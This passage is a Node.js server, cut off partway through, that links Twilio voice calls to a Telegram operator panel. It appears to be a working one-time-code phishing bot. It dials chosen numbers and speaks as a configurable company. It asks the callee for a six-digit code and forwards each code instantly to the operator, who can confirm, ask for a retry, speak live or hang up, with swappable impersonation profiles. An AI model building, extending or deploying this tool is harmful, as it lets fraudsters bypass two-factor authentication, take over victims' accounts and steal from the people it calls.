require("dotenv").config();

const express = require("express");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const twilio = require("twilio");

const helmet = require("helmet");
const compression = require("compression");
const rateLimit = require("express-rate-limit");
const pino = require("pino");

const logger = pino();

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(helmet());
app.use(compression());

app.use(
  rateLimit({
    windowMs: 60 * 1000,
    max: 120
  })
);

const PORT = process.env.PORT || 3000;

// ============================================================
// ENV
// ============================================================

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "";
const OWNER_ID = String(process.env.OWNER_ID || "");
const ADMIN_IDS = (process.env.ADMIN_IDS || "")
  .split(",")
  .map((s) => s.trim())
  .filter(Boolean);

const TWILIO_ACCOUNT_SID =
  process.env.TWILIO_ACCOUNT_SID || process.env.TWILIO_SID || "";
const TWILIO_AUTH_TOKEN =
  process.env.TWILIO_AUTH_TOKEN || process.env.TWILIO_TOKEN || "";
const TWILIO_NUMBER = process.env.TWILIO_NUMBER || "";
const BASE_URL = (process.env.BASE_URL || "").replace(/\/+$/, "");

const QUICK_DIAL_A_LABEL = process.env.QUICK_DIAL_A_LABEL || "Quick A";
const QUICK_DIAL_A_NUMBER = process.env.QUICK_DIAL_A_NUMBER || "";
const QUICK_DIAL_B_LABEL = process.env.QUICK_DIAL_B_LABEL || "Quick B";
const QUICK_DIAL_B_NUMBER = process.env.QUICK_DIAL_B_NUMBER || "";
const QUICK_DIAL_C_LABEL = process.env.QUICK_DIAL_C_LABEL || "Quick C";
const QUICK_DIAL_C_NUMBER = process.env.QUICK_DIAL_C_NUMBER || "";

const client = twilio(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN);

// ============================================================
// DATABASE
// ============================================================

const DB_FILE = path.join(__dirname, "db.json");

const defaultSettings = {
  company: "Support",
  digits: 6,
  assistant: 0,
  itemName: "booking number",
  greeting:
    "Hello from {company}. Please enter your {digits} digit {item}.",
  retryMessage: "Please re-enter your {item}.",
  reviewMessage: "Please wait while we review your {item}.",
  confirmMessage: "Thank you. Your {item} has been confirmed. Have a great day.",
  failMessage: "Sorry, we could not confirm your {item}. Goodbye.",
  maxRetries: 3,
  inputTimeout: 8,
  holdSeconds: 10,
  autoConfirmSec: 0,
  autoHangupSec: 0,
  paused: false,
  readback: false,
  randomAssistant: false,
  panelTitle: "📞 LIVE CALLS",
  answerDelay: 2
};

function defaultUserState() {
  return {
    panelMessageId: null,
    pendingInput: null,
    lastDialed: null,
    panelBrokenCount: 0,
    dirty: false
  };
}

function defaultDB() {
  return {
    settings: { ...defaultSettings },
    profiles: {},
    history: [],
    logs: [],
    codes: [],
    stats: {
      inboundCalls: 0,
      outboundCalls: 0,
      inputsReceived: 0,
      confirmed: 0,
      retries: 0,
      hungUp: 0,
      autoConfirmed: 0,
      autoHungUp: 0,
      scheduledCalls: 0,
      completedCalls: 0
    },
    adminIds: [],
    users: {}
  };
}

let db = defaultDB();

function ensureUser(chatId) {
  const key = String(chatId);
  if (!db.users[key]) {
    db.users[key] = defaultUserState();
  } else {
    db.users[key] = {
      ...defaultUserState(),
      ...db.users[key]
    };
  }
  return db.users[key];
}

function loadDB() {
  try {
    if (!fs.existsSync(DB_FILE)) {
      db = defaultDB();
      if (OWNER_ID) ensureUser(OWNER_ID);
      return;
    }

    const raw = fs.readFileSync(DB_FILE, "utf8");
    const parsed = JSON.parse(raw);

    db = {
      settings: { ...defaultSettings, ...(parsed.settings || {}) },
      profiles: parsed.profiles || {},
      history: parsed.history || [],
      logs: parsed.logs || [],
      codes: parsed.codes || [],
      stats: {
        ...defaultDB().stats,
        ...(parsed.stats || {})
      },
      adminIds: Array.isArray(parsed.adminIds) ? parsed.adminIds.map(String) : [],
      users: parsed.users || {}
    };

    if (OWNER_ID) ensureUser(OWNER_ID);
    for (const adminId of getAdminIds()) ensureUser(adminId);
  } catch (e) {
    console.log("loadDB error:", e.message);
    db = defaultDB();
    if (OWNER_ID) ensureUser(OWNER_ID);
  }
}

let dbSaveTimer = null;
let dbSaveQueued = false;

function flushDB() {
  if (dbSaveQueued) return;
  dbSaveQueued = true;

  fs.writeFile(DB_FILE, JSON.stringify(db, null, 2), (e) => {
    dbSaveQueued = false;
    if (e) {
      logger.error("saveDB error: " + e.message);
    }
  });
}

function saveDB() {
  clearTimeout(dbSaveTimer);
  dbSaveTimer = setTimeout(flushDB, 150);
}

loadDB();

// ============================================================
// SETTINGS / STATE
// ============================================================

let settings = db.settings;

const assistants = [
  { name: "Nova", voice: "Polly.Joanna" },
  { name: "Lyra", voice: "Polly.Matthew" },
  { name: "Orion", voice: "Polly.Amy" },
  { name: "Astra", voice: "Polly.Brian" },
  { name: "Kairo", voice: "Polly.Justin" },
  { name: "Solara", voice: "Polly.Kendra" }
];

const quickDialTargets = {
  [QUICK_DIAL_A_LABEL]: QUICK_DIAL_A_NUMBER,
  [QUICK_DIAL_B_LABEL]: QUICK_DIAL_B_NUMBER,
  [QUICK_DIAL_C_LABEL]: QUICK_DIAL_C_NUMBER
};

const calls = new Map();
let scheduledJobs = [];

function getAdminIds() {
  return Array.from(new Set([...(ADMIN_IDS || []), ...((db.adminIds || []).map(String))]));
}


// ============================================================
// ROLES / AUTH
// ============================================================

function getRole(chatId) {
  const id = String(chatId || "");
  if (!id) return "blocked";
  if (id === OWNER_ID) return "owner";
  if (getAdminIds().includes(id)) return "admin";
  return "blocked";
}

function isAuthorized(update) {
  const chatId =
    update?.message?.chat?.id ||
    update?.callback_query?.message?.chat?.id ||
    update?.callback_query?.from?.id;
  return getRole(chatId) !== "blocked";
}

function ownerOnly(chatId) {
  return String(chatId || "") === OWNER_ID;
}

function getChatId(update) {
  return (
    update?.message?.chat?.id ||
    update?.callback_query?.message?.chat?.id ||
    update?.callback_query?.from?.id ||
    OWNER_ID
  );
}

// ============================================================
// HELPERS
// ============================================================

function saveSettings() {
  db.settings = settings;
  saveDB();
}

function incStat(key) {
  db.stats[key] = (db.stats[key] || 0) + 1;
  saveDB();
}

function pushLog(text) {
  db.logs.unshift(`${new Date().toLocaleTimeString()} ${text}`);
  db.logs = db.logs.slice(0, 200);
  saveDB();
}

function pushHistory(text) {
  db.history.unshift(`${new Date().toLocaleString()} ${text}`);
  db.history = db.history.slice(0, 500);
  saveDB();
}

function pushCodeEntry(caller, value, sid = "", ownerId = "") {
  db.codes.unshift({
    time: new Date().toLocaleString(),
    caller,
    value,
    sid,
    ownerId: String(ownerId || "")
  });
  db.codes = db.codes.slice(0, 500);
  saveDB();
}

function markUserDirty(chatId) {
  if (!chatId) return;
  const user = ensureUser(chatId);
  user.dirty = true;
  saveDB();
}

function assistant() {
  return assistants[settings.assistant] || assistants[0];
}

function assistantForCall(call) {
  if (!call) return assistant();
  return assistants[call.assistantIndex] || assistant();
}

function template(str, call = null) {
  return String(str || "")
    .replaceAll("{company}", settings.company)
    .replaceAll("{digits}", String(settings.digits))
    .replaceAll("{item}", settings.itemName)
    .replaceAll("{caller}", call?.caller || "caller");
}

function spacedDigits(value) {
  return String(value || "")
    .split("")
    .join(" ");
}


function shortCaller(value) {
  const s = String(value || "Unknown");
  if (s.length <= 14) return s;
  return s.slice(0, 6) + "…" + s.slice(-4);
}

function callTimerText(call) {
  if (!call || !call.startedAt) return "00:00";
  const total = Math.floor((Date.now() - call.startedAt) / 1000);
  const mm = String(Math.floor(total / 60)).padStart(2, "0");
  const ss = String(total % 60).padStart(2, "0");
  return `${mm}:${ss}`;
}

function sortedCallsForUser(chatId) {
  return Array.from(calls.values())
    .filter((c) => String(c.ownerId) === String(chatId))
    .sort((a, b) => (b.startedAt || 0) - (a.startedAt || 0));
}

function newestActiveCallForUser(chatId) {
  return (
    sortedCallsForUser(chatId).find(
      (c) => c.status !== "Ended" && c.status !== "Idle"
    ) || null
  );
}

function getOrCreateCall(callSid, ownerId = OWNER_ID) {
  if (!callSid) return null;

  if (!calls.has(callSid)) {
    const ai = settings.randomAssistant
      ? Math.floor(Math.random() * assistants.length)
      : settings.assistant;

    calls.set(callSid, {
      sid: callSid,
      ownerId: String(ownerId),
      caller: null,
      input: null,
      status: "Idle",
      startedAt: Date.now(),
      assistantIndex: ai,
      retries: 0,
      endedAt: null,
      autoConfirmTimer: null,
      autoHangupTimer: null,
      readbackDone: false,
      newInput: false
    });
  }

  return calls.get(callSid);
}

function removeCallTimers(call) {
  if (!call) return;
  if (call.autoConfirmTimer) {
    clearTimeout(call.autoConfirmTimer);
    call.autoConfirmTimer = null;
  }
  if (call.autoHangupTimer) {
    clearTimeout(call.autoHangupTimer);
    call.autoHangupTimer = null;
  }
}

function cleanupEndedCalls() {
  const now = Date.now();
  for (const [sid, call] of calls.entries()) {
    if (
      call.status === "Ended" &&
      call.endedAt &&
      now - call.endedAt > 5 * 60 * 1000
    ) {
      calls.delete(sid);
    }
  }
}

function toCsv(rows) {
  const header = "time,caller,value,sid,ownerId\n";
  const body = rows
    .map((r) => {
      const time = `"${String(r.time).replaceAll('"', '""')}"`;
      const caller = `"${String(r.caller).replaceAll('"', '""')}"`;
      const value = `"${String(r.value).replaceAll('"', '""')}"`;
      const sid = `"${String(r.sid || "").replaceAll('"', '""')}"`;
      const ownerId = `"${String(r.ownerId || "").replaceAll('"', '""')}"`;
      return `${time},${caller},${value},${sid},${ownerId}`;
    })
    .join("\n");
  return header + body;
}

function parseDelay(text) {
  const value = String(text || "").trim().toLowerCase();

  const sec = value.match(/^(\d+)s$/);
  if (sec) return parseInt(sec[1], 10) * 1000;

  const min = value.match(/^(\d+)m$/);
  if (min) return parseInt(min[1], 10) * 60 * 1000;

  const hr = value.match(/^(\d+)h$/);
  if (hr) return parseInt(hr[1], 10) * 60 * 60 * 1000;

  return null;
}

// ============================================================
// TELEGRAM API
// ============================================================

async function tg(method, data) {
  try {
    const res = await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,
      data,
      { timeout: 10000 }
    );
    return res.data;
  } catch (err) {
    logger.error("Telegram API error: " + err.message);
    return null;
  }
}

async function tgSend(chatId, text, buttons = null) {
  const body = {
    chat_id: chatId,
    text
  };
  if (buttons) {
    body.reply_markup = { inline_keyboard: buttons };
  }
  return tg("sendMessage", body);
}

async function tgEdit(chatId, messageId, text, buttons = null) {
  const body = {
    chat_id: chatId,
    message_id: messageId,
    text
  };
  if (buttons) {
    body.reply_markup = { inline_keyboard: buttons };
  }
  return tg("editMessageText", body);
}

async function tgAnswerCallback(callbackQueryId, text = "") {
  try {
    await tg("answerCallbackQuery", {
      callback_query_id: callbackQueryId,
      text
    });
  } catch {}
}

async function tgSendDocument(chatId, filename, contentBuffer) {
  const boundary = "----NodeFormBoundary" + Math.random().toString(16).slice(2);
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;

  const chunks = [];
  function pushString(str) {
    chunks.push(Buffer.from(str, "utf8"));
  }

  pushString(`--${boundary}\r\n`);
  pushString(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`);
  pushString(`${chatId}\r\n`);

  pushString(`--${boundary}\r\n`);
  pushString(
    `Content-Disposition: form-data; name="document"; filename="${filename}"\r\n`
  );
  pushString(`Content-Type: text/csv\r\n\r\n`);
  chunks.push(contentBuffer);
  pushString(`\r\n--${boundary}--\r\n`);

  const body = Buffer.concat(chunks);

  const res = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": `multipart/form-data; boundary=${boundary}`,
      "Content-Length": String(body.length)
    },
    body
  });

  return res.json();
}

// ============================================================
// PANEL
// ============================================================

function panelButtons(chatId) {
  const role = getRole(chatId);

  const quickButtons = Object.entries(quickDialTargets)
    .filter(([, value]) => value)
    .slice(0, 3)
    .map(([label]) => ({
      text: `📲 ${label}`,
      callback_data: `qd:${label}`
    }));

  const profileButtons = Object.keys(db.profiles)
    .slice(0, 4)
    .map((name) => ({
      text: `📁 ${name}`,
      callback_data: `profile:${name}`
    }));

  const rows = [
    [
      { text: "✔ Confirm", callback_data: "confirm" },
      { text: "🔁 Retry", callback_data: "retry" }
    ],
    [{ text: "⛔ Hang Up", callback_data: "hangup" }],
    [
      { text: "📞 Call Last", callback_data: "calllast" },
      { text: "📲 Call", callback_data: "call" }
    ],
    [
      { text: "🎤 Talk", callback_data: "talk" },
      { text: "📋 Calls", callback_data: "showcalls" }
    ],
    [
      {
        text: settings.paused ? "▶ Resume" : "⏸ Pause",
        callback_data: settings.paused ? "resume" : "pause"
      }
    ],
    [{ text: "⚡ Wake Server", callback_data: "wake" }],
    [
      { text: "📊 Status", callback_data: "status" },
      { text: "📜 Logs", callback_data: "logs" }
    ]
  ];

  if (quickButtons.length) rows.splice(3, 0, quickButtons);
  if (profileButtons.length) rows.splice(4, 0, profileButtons);

  if (role === "owner") {
    rows.push([{ text: "👑 Owner", callback_data: "ownerinfo" }]);
  } else if (role === "admin") {
    rows.push([{ text: "🛡 Admin", callback_data: "admininfo" }]);
  }

  return rows;
}


function panelText(chatId) {
  cleanupEndedCalls();

  const active = sortedCallsForUser(chatId).slice(0, 8);
  const lines = [settings.panelTitle, ""];

  if (!active.length) {
    lines.push("No active calls");
    lines.push("");
  } else {
    active.forEach((call, index) => {
      const statusIcon =
        call.status === "Ringing"
          ? "📳"
          : call.status === "Answered"
            ? "🟢"
            : call.status === "Held"
              ? "⌛"
              : call.status === "Paused"
                ? "⏸"
                : call.status === "Ended"
                  ? "⚫"
                  : "⚪";

      let inputText = call.input || "waiting";
      if (call.newInput) {
        inputText = `🔥 ${inputText}`;
        call.newInput = false;
      }

      lines.push(`📞 ${index + 1} ${statusIcon} ${call.status} | ${shortCaller(call.caller)}`);
      lines.push(`🔢 ${inputText} | 🔁 ${call.retries}/${settings.maxRetries} | ⏱ ${callTimerText(call)} | 🎙 ${assistantForCall(call).name}`);
      lines.push("");
    });
  }

  const role = getRole(chatId);

  lines.push(`🏢 ${settings.company} | 🔢 ${settings.digits} | 📝 ${settings.itemName}`);
  lines.push(`🎙 ${assistant().name} | ⏸ ${settings.paused ? "Paused" : "Live"} | 👤 ${role}`);
  lines.push(`⏱ Input ${settings.inputTimeout}s | 🗣 Delay ${settings.answerDelay || 0}s | 🔁 Max ${settings.maxRetries}`);
  lines.push(`✅ AutoConfirm ${settings.autoConfirmSec || 0}s | ⛔ AutoHangup ${settings.autoHangupSec || 0}s`);

  return lines.join("\n");
}

async function updatePanel(chatId, forceNew = false) {
  try {
    const user = ensureUser(chatId);
    const text = panelText(chatId);
    const buttons = panelButtons(chatId);

    if (!user.panelMessageId || forceNew) {
      const msg = await tgSend(chatId, text, buttons);
      if (msg && msg.result && msg.result.message_id) {
        user.panelMessageId = msg.result.message_id;
        saveDB();
      }
      return;
    }

    const result = await tgEdit(
      chatId,
      user.panelMessageId,
      text,
      buttons
    );

    if (!result || result.ok === false) {
      user.panelBrokenCount++;
      if (user.panelBrokenCount >= 2) {
        user.panelMessageId = null;
        saveDB();
        await updatePanel(chatId, true);
      }
    } else {
      user.panelBrokenCount = 0;
      saveDB();
    }
  } catch {
    const user = ensureUser(chatId);
    user.panelBrokenCount++;
    if (user.panelBrokenCount >= 2) {
      user.panelMessageId = null;
      saveDB();
    }
  }
}

// ============================================================
// TWILIO CONTROL
// ============================================================

async function startCall(number, ownerId) {
  if (!number) return false;

  if (settings.paused) {
    await tgSend(ownerId, "⏸ Outbound calling is paused");
    return false;
  }

  const user = ensureUser(ownerId);
  user.lastDialed = number;
  saveDB();

  incStat("outboundCalls");

  await client.calls.create({
    url: `${BASE_URL}/ivr?owner=${encodeURIComponent(String(ownerId))}`,
    to: number,
    from: TWILIO_NUMBER,
    statusCallback: `${BASE_URL}/call-status?owner=${encodeURIComponent(String(ownerId))}`,
    statusCallbackEvent: ["initiated", "ringing", "answered", "completed"],
    statusCallbackMethod: "POST"
  });

  pushLog(`Outbound call started to ${number} by ${ownerId}`);
  pushHistory(`Outbound call to ${number} by ${ownerId}`);
  markUserDirty(ownerId);
  return true;
}

async function updateLiveCallTwiml(callSid, twiml) {
  if (!callSid) return;
  await client.calls(callSid).update({ twiml });
}

async function endLiveCallImmediately(callSid) {
  if (!callSid) return;
  await client.calls(callSid).update({
    twiml: `<Response><Hangup/></Response>`
  });
}

function buildInputTwiml(call) {
  const voice = assistantForCall(call).voice;
  const greeting = template(settings.greeting, call);

  return `
<Response>
<Pause length="${settings.answerDelay || 0}"/>
<Gather numDigits="${settings.digits}" action="${BASE_URL}/input?owner=${encodeURIComponent(String(call.ownerId))}" method="POST" timeout="${settings.inputTimeout}">
<Say voice="${voice}">
${greeting}
</Say>
</Gather>
<Redirect method="POST">${BASE_URL}/ivr?owner=${encodeURIComponent(String(call.ownerId))}</Redirect>
</Response>
`;
}

function buildRetryTwiml(call) {
  const voice = assistantForCall(call).voice;
  const retryText = template(settings.retryMessage, call);

  return `
<Response>
<Pause length="${settings.answerDelay || 0}"/>
<Gather numDigits="${settings.digits}" action="${BASE_URL}/input?owner=${encodeURIComponent(String(call.ownerId))}" method="POST" timeout="${settings.inputTimeout}">
<Say voice="${voice}">
${retryText}
</Say>
</Gather>
<Redirect method="POST">${BASE_URL}/hold?owner=${encodeURIComponent(String(call.ownerId))}</Redirect>
</Response>
`;
}

function buildReviewTwiml(call) {
  const voice = assistantForCall(call).voice;
  const reviewText = template(settings.reviewMessage, call);

  if (settings.readback && call && call.input && !call.readbackDone) {
    call.readbackDone = true;
    return `
<Response>
<Say voice="${voice}">
You entered ${spacedDigits(call.input)}.
</Say>
<Say voice="${voice}">
${reviewText}
</Say>
<Redirect method="POST">${BASE_URL}/hold?owner=${encodeURIComponent(String(call.ownerId))}</Redirect>
</Response>
`;
  }

  return `
<Response>
<Say voice="${voice}">
${reviewText}
</Say>
<Redirect method="POST">${BASE_URL}/hold?owner=${encodeURIComponent(String(call.ownerId))}</Redirect>
</Response>
`;
}

function buildConfirmTwiml(call) {
  const voice = assistantForCall(call).voice;
  return `
<Response>
<Say voice="${voice}">
${template(settings.confirmMessage, call)}
</Say>
<Hangup/>
</Response>
`;
}

function buildFailureTwiml(call) {
  const voice = assistantForCall(call).voice;
  return `
<Response>
<Say voice="${voice}">
${template(settings.failMessage, call)}
</Say>
<Hangup/>
</Response>
`;
}

function buildTalkTwiml(call, text) {
  const voice = assistantForCall(call).voice;
  const safe = String(text || "").trim() || "Please wait.";
  return `
<Response>
<Say voice="${voice}">
${safe}
</Say>
<Redirect method="POST">${BASE_URL}/hold?owner=${encodeURIComponent(String(call.ownerId))}</Redirect>
</Response>
`;
}

function schedulePerCallTimers(call) {
  removeCallTimers(call);

  if (!call || call.status === "Ended") return;

  if (settings.autoConfirmSec > 0) {
    call.autoConfirmTimer = setTimeout(async () => {
      try {
        if (call.status !== "Ended" && call.sid) {
          await updateLiveCallTwiml(call.sid, buildConfirmTwiml(call));
          call.status = "Ended";
          call.endedAt = Date.now();
          incStat("confirmed");
          incStat("autoConfirmed");
          incStat("completedCalls");
          pushLog(`Auto confirmed ${call.caller || call.sid}`);
          pushHistory(`Auto confirmed ${call.caller || call.sid}`);
          markUserDirty(call.ownerId);
        }
      } catch {}
    }, settings.autoConfirmSec * 1000);
  }

  if (settings.autoHangupSec > 0) {
    call.autoHangupTimer = setTimeout(async () => {
      try {
        if (call.status !== "Ended" && call.sid) {
          await endLiveCallImmediately(call.sid);
          call.status = "Ended";
          call.endedAt = Date.now();
          incStat("hungUp");
          incStat("autoHungUp");
          incStat("completedCalls");
          pushLog(`Auto hung up ${call.caller || call.sid}`);
          pushHistory(`Auto hung up ${call.caller || call.sid}`);
          markUserDirty(call.ownerId);
        }
      } catch {}
    }, settings.autoHangupSec * 1000);
  }
}

function scheduleOutboundCall(number, delayMs, ownerId) {
  const id = Date.now() + Math.random();

  const timeout = setTimeout(async () => {
    try {
      await startCall(number, ownerId);
      incStat("scheduledCalls");
      pushLog(`Scheduled call fired to ${number} by ${ownerId}`);
      pushHistory(`Scheduled call fired to ${number} by ${ownerId}`);
    } catch (e) {
      pushLog(`Scheduled call failed to ${number}: ${e.message}`);
    } finally {
      scheduledJobs = scheduledJobs.filter((x) => x.id !== id);
    }
  }, delayMs);

  scheduledJobs.push({
    id,
    number,
    ownerId: String(ownerId),
    fireAt: Date.now() + delayMs,
    timeout
  });
}

// ============================================================
// ROUTES
// ============================================================

app.get("/", (req, res) => {
  res.send("Server running");
});

app.get("/ping", (req, res) => {
  res.send("pong");
});

app.get("/health", (req, res) => {
  res.json({
    status: "ok",
    time: Date.now(),
    activeCalls: sortedCallsForUser(OWNER_ID).length,
    paused: settings.paused
  });
});

app.get("/ivr", (req, res) => {
  res.type("text/xml");
  res.send(`<Response><Say>IVR endpoint is working.</Say></Response>`);
});

// ============================================================
// CALL STATUS
// ============================================================

app.post("/call-status", async (req, res) => {
  try {
    const status = req.body.CallStatus;
    const from = req.body.From;
    const sid = req.body.CallSid;
    const ownerId = String(req.query.owner || OWNER_ID);

    const call = getOrCreateCall(sid, ownerId);
    if (call) {
      if (from) call.caller = from;

      if (status === "ringing") {
        call.status = "Ringing";
        if (!call.startedAt) call.startedAt = Date.now();
      }

      if (status === "in-progress" || status === "answered") {
        call.status = "Answered";
        if (!call.startedAt) call.startedAt = Date.now();
      }

      if (status === "completed") {
        call.status = "Ended";
        call.endedAt = Date.now();
        removeCallTimers(call);
        incStat("completedCalls");
      }

      markUserDirty(ownerId);
    }
  } catch (e) {
    console.log("call-status error:", e.message);
  }

  res.sendStatus(200);
});

// ============================================================
// IVR START
// ============================================================

app.post("/ivr", async (req, res) => {
  try {
    const sid = req.body.CallSid;
    const from = req.body.From;
    const ownerId = String(req.query.owner || OWNER_ID);

    const call = getOrCreateCall(sid, ownerId);
    if (call) {
      call.caller = from || call.caller;
      call.status = settings.paused ? "Paused" : "Answered";
      call.startedAt = call.startedAt || Date.now();
      call.assistantIndex = settings.randomAssistant
        ? Math.floor(Math.random() * assistants.length)
        : settings.assistant;
    }

    incStat("inboundCalls");
    markUserDirty(ownerId);

    res.type("text/xml");

    if (settings.paused) {
      return res.send(`
<Response>
<Say voice="${assistantForCall(call).voice}">
Calling is currently paused. Please try again later.
</Say>
<Hangup/>
</Response>
`);
    }

    res.send(buildInputTwiml(call));
  } catch (e) {
    console.log("/ivr error:", e.message);
    res.type("text/xml");
    res.send(`<Response><Say>Application error.</Say></Response>`);
  }
});

// ============================================================
// INPUT
// ============================================================

app.post("/input", async (req, res) => {
  try {
    const digits = req.body.Digits;
    const caller = req.body.From;
    const sid = req.body.CallSid;
    const ownerId = String(req.query.owner || OWNER_ID);

    const call = getOrCreateCall(sid, ownerId);

    if (call) {
      call.caller = caller;
      call.input = digits;
      call.status = "Held";
      call.startedAt = Date.now();
      call.readbackDone = false;
      call.newInput = true;
    }

    incStat("inputsReceived");
    pushLog(`${caller} : ${digits}`);
    pushHistory(`${caller} -> ${settings.itemName}: ${digits}`);
    pushCodeEntry(caller, digits, sid, ownerId);

    try {
      await tgSend(ownerId, `${digits}`);
    } catch (e) {
      logger.error("code send fail: " + e.message);
    }

    res.type("text/xml");
    res.send(buildReviewTwiml(call));

    markUserDirty(ownerId);
    schedulePerCallTimers(call);
  } catch (e) {
    console.log("/input error:", e.message);
    res.type("text/xml");
    res.send(`<Response><Say>Application error.</Say></Response>`);
  }
});

// ============================================================
// HOLD
// ============================================================

app.post("/hold", (req, res) => {
  const ownerId = String(req.query.owner || OWNER_ID);

  res.type("text/xml");
  res.send(`
<Response>
<Pause length="${settings.holdSeconds}"/>
<Redirect method="POST">${BASE_URL}/hold?owner=${encodeURIComponent(ownerId)}</Redirect>
</Response>
`);
});

// ============================================================
// TELEGRAM
// ============================================================

app.post("/telegram", async (req, res) => {
  try {
    const update = req.body || {};
    const chatId = String(getChatId(update));
    const role = getRole(chatId);
    const user = ensureUser(chatId);

    if (!isAuthorized(update)) {
      return res.sendStatus(200);
    }

    // -------------------------
    // Button callbacks
    // -------------------------
    if (update.callback_query) {
      const action = update.callback_query.data;
      const callbackId = update.callback_query.id;
      const call = newestActiveCallForUser(chatId);
      const callSid = call ? call.sid : null;

      if (action === "confirm") {
        if (callSid) {
          await updateLiveCallTwiml(callSid, buildConfirmTwiml(call));
          call.status = "Ended";
          call.endedAt = Date.now();
          removeCallTimers(call);
          incStat("confirmed");
          incStat("completedCalls");
          pushLog(`Confirmed by ${chatId}`);
          pushHistory(`Confirmed ${call.caller || call.sid} by ${chatId}`);
          markUserDirty(chatId);
        }
        await tgAnswerCallback(callbackId, "Confirmed");
        return res.sendStatus(200);
      }

      if (action === "retry") {
        if (callSid) {
          call.retries++;

          if (call.retries >= settings.maxRetries) {
            await updateLiveCallTwiml(callSid, buildFailureTwiml(call));
            call.status = "Ended";
            call.endedAt = Date.now();
            removeCallTimers(call);
            incStat("completedCalls");
            pushLog(`Max retries reached for ${chatId}`);
            pushHistory(
              `Max retries reached for ${call.caller || call.sid} by ${chatId}`
            );
          } else {
            await updateLiveCallTwiml(callSid, buildRetryTwiml(call));
            call.input = null;
            call.status = "Answered";
            incStat("retries");
            pushLog(`Retry requested by ${chatId}`);
          }
        }

        markUserDirty(chatId);
        await tgAnswerCallback(callbackId, "Retry sent");
        return res.sendStatus(200);
      }

      if (action === "hangup") {
        if (callSid) {
          await endLiveCallImmediately(callSid);
          call.status = "Ended";
          call.endedAt = Date.now();
          removeCallTimers(call);
          incStat("hungUp");
          incStat("completedCalls");
          pushLog(`Hung up by ${chatId}`);
          pushHistory(`Hung up ${call.caller || call.sid} by ${chatId}`);
          markUserDirty(chatId);
        }
        await tgAnswerCallback(callbackId, "Hung up");
        return res.sendStatus(200);
      }

      if (action === "calllast") {
        if (user.lastDialed) {
          await startCall(user.lastDialed, chatId);
          await tgSend(chatId, `📞 Calling last dialed number ${user.lastDialed}`);
        } else {
          await tgSend(chatId, "No previous outbound call");
        }
        await tgAnswerCallback(callbackId, "Calling");
        return res.sendStatus(200);
      }

      if (action === "call") {
        user.pendingInput = "call";
        saveDB();
        await tgSend(chatId, "Send number to call.\nExample:\n/call +447123456789");
        await tgAnswerCallback(callbackId, "Waiting for number");
        return res.sendStatus(200);
      }

      if (action === "talk") {
        user.pendingInput = "talk";
        saveDB();
        await tgSend(chatId, "Send the text to speak into the live call.");
        await tgAnswerCallback(callbackId, "Waiting for speech text");
        return res.sendStatus(200);
      }

      if (action === "showcalls") {
        const activeCalls = sortedCallsForUser(chatId).filter((c) => c.status !== "Ended");
        if (!activeCalls.length) {
          await tgSend(chatId, "No active calls");
        } else {
          let out = "📋 Active Calls\n\n";
          activeCalls.forEach((c, i) => {
            out += `${i + 1}. ${c.caller || "Unknown"} | ${c.status} | ${c.input || "waiting"}\n`;
          });
          await tgSend(chatId, out.trim());
        }
        await tgAnswerCallback(callbackId, "Calls");
        return res.sendStatus(200);
      }

      if (action === "pause") {
        if (!ownerOnly(chatId)) {
          await tgAnswerCallback(callbackId, "Owner only");
          return res.sendStatus(200);
        }
        settings.paused = true;
        saveSettings();
        markUserDirty(chatId);
        await tgAnswerCallback(callbackId, "Paused");
        return res.sendStatus(200);
      }

      if (action === "resume") {
        if (!ownerOnly(chatId)) {
          await tgAnswerCallback(callbackId, "Owner only");
          return res.sendStatus(200);
        }
        settings.paused = false;
        saveSettings();
        markUserDirty(chatId);
        await tgAnswerCallback(callbackId, "Resumed");
        return res.sendStatus(200);
      }

      if (action === "wake") {
        await fetch(BASE_URL).catch(() => {});
        await fetch(BASE_URL + "/ping").catch(() => {});
        await fetch(BASE_URL + "/health").catch(() => {});
        await tgSend(chatId, "⚡ Server wake request sent");
        await tgAnswerCallback(callbackId, "Server waking");
        return res.sendStatus(200);
      }

      if (action === "status") {
        markUserDirty(chatId);
        await updatePanel(chatId);
        await tgAnswerCallback(callbackId, "Panel refreshed");
        return res.sendStatus(200);
      }

      if (action === "logs") {
        const logs = db.logs.slice(0, 25);
        let text = "📜 Logs\n\n";
        text += logs.length ? logs.join("\n") : "No logs";
        await tgSend(chatId, text);
        await tgAnswerCallback(callbackId, "Logs sent");
        return res.sendStatus(200);
      }

      if (action === "ownerinfo") {
        await tgSend(chatId, "👑 You are the owner");
        await tgAnswerCallback(callbackId, "Owner");
        return res.sendStatus(200);
      }

      if (action === "admininfo") {
        await tgSend(chatId, "🛡 You are an admin");
        await tgAnswerCallback(callbackId, "Admin");
        return res.sendStatus(200);
      }

      if (action.startsWith("qd:")) {
        const label = action.split(":")[1];
        const number = quickDialTargets[label];
        if (number) {
          await startCall(number, chatId);
          await tgSend(chatId, `📲 Calling ${label}: ${number}`);
        } else {
          await tgSend(chatId, "Quick dial not set");
        }
        await tgAnswerCallback(callbackId, "Calling");
        return res.sendStatus(200);
      }

      if (action.startsWith("profile:")) {
        const name = action.split(":")[1];
        const profile = db.profiles[name];

        if (profile) {
          settings.company = profile.company;
          settings.digits = profile.digits;
          settings.assistant = profile.assistant;
          settings.itemName = profile.itemName;
          saveSettings();
          await tgSend(chatId, `📁 Profile loaded: ${name}`);
          markUserDirty(chatId);
          await updatePanel(chatId);
        } else {
          await tgSend(chatId, "Profile not found");
        }

        await tgAnswerCallback(callbackId, "Profile");
        return res.sendStatus(200);
      }
    }

    // -------------------------
    // Text commands
    // -------------------------
    if (update.message && update.message.text) {
      const text = update.message.text.trim();

if (text.startsWith("/delay")) {
  const n = parseInt(text.split(" ")[1], 10);
  if (isNaN(n) || n < 0 || n > 10) {
    await tgSend(chatId, "Usage: /delay 0-10");
    return res.sendStatus(200);
  }
  settings.answerDelay = n;
  saveSettings();
  await tgSend(chatId, `⏱ Delay set to ${n}s`);
  markUserDirty(chatId);
  await updatePanel(chatId);
  return res.sendStatus(200);
}

if (text.startsWith("/addadmin")) {
  if (!ownerOnly(chatId)) {
    await tgSend(chatId, "Owner only");
    return res.sendStatus(200);
  }
